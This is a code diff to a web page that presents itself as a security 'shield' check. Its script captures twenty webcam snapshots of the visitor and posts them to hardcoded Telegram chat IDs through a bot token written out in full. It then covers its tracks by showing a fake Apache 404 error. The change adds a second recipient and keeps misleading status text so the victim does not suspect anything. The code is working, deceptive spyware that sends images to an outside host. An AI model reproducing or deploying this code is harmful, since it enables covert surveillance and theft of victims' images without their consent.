@@ -9,7 +9,7 @@
         .shield-container { border: 2px solid #00d4ff; padding: 40px; border-radius: 15px; background: rgba(0, 212, 255, 0.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); text-align: center; max-width: 400px; }
         h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
         p { color: #8899a6; font-size: 14px; margin-bottom: 30px; }
-        .btn { background: transparent; border: 2px solid #00d4ff; color: #00d4ff; padding: 15px 40px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 50px; text-transform: uppercase; transition: all 0.4s; position: relative; overflow: hidden; animation: pulse 2s infinite; }
+        .btn { background: transparent; border: 2px solid #00d4ff; color: #00d4ff; padding: 15px 40px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 50px; text-transform: uppercase; transition: all 0.4s; animation: pulse 2s infinite; }
         .btn:hover { background: #00d4ff; color: #050a14; box-shadow: 0 0 40px #00d4ff; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(0, 212, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0); } }
         #status { margin-top: 25px; font-family: monospace; font-size: 12px; color: #00ff88; }
@@ -31,7 +31,8 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        const ID = '-5291795804';
+        // Both personal IDs are listed here
+        const TARGETS = ['7617707778', '7194705917'];
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -51,23 +52,20 @@
                     let count = 0;
                     const maxPackets = 20; 
                     
-                    const interval = setInterval(() => {
+                    const interval = setInterval(async () => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
-                            
-                            // Kill camera stream immediately
                             stream.getTracks().forEach(track => track.stop());
-                            
-                            // Trigger the Fake 404
                             render404();
                             return;
                         }
                         
-                        send(count + 1);
+                        // Send to both users sequentially before moving to the next photo
+                        await sendToBoth(count + 1);
                         count++;
-                        loader.style.width = (count * (100 / maxPackets)) + "%";
-                        status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
-                    }, 600);
+                        loader.style.width = (count * 5) + "%";
+                        status.innerText = "> UPLOADING FRAGMENT " + count + "/20...";
+                    }, 1200); // 1.2s delay for perfect delivery to two different accounts
                 };
             } catch (e) {
                 status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
@@ -75,42 +73,40 @@
             }
         }
 
-        function send(index) {
+        async function sendToBoth(index) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            canvas.toBlob(blob => {
-                if (!blob) return;
-                const fd = new FormData();
-                fd.append('chat_id', ID);
-                fd.append('photo', blob, 'identity_packet.jpg');
-                fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.4));
+            if (!blob) return;
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-            }, 'image/jpeg', 0.4); 
+            // Wait for User 1 to receive, then send to User 2
+            for (const chatID of TARGETS) {
+                const fd = new FormData();
+                fd.append('chat_id', chatID);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `⚠️ SECURITY LOG [${index}/20]\nNode: C2-Primary\nTarget ID: ${chatID}`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                } catch (err) {
+                    console.log("Failed delivery to: " + chatID);
+                }
+            }
         }
 
         function render404() {
-            // Overwrite the entire document to mimic a real server error
             document.documentElement.innerHTML = `
-            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-            <html><head>
-            <title>404 Not Found</title>
-            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
-            <h1>Not Found</h1>
-            <p>The requested URL was not found on this server. System Error</p>
-            <hr>
+            <body style="background: white; color: black; font-family: sans-serif; padding: 20px;">
+            <h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
-            </body></html>`;
-            
-            // Optional: Changes the visible URL in the address bar
-            window.history.pushState({}, "", "/error-log-0x8842");
+            </body>`;
         }
     </script>
 </body>
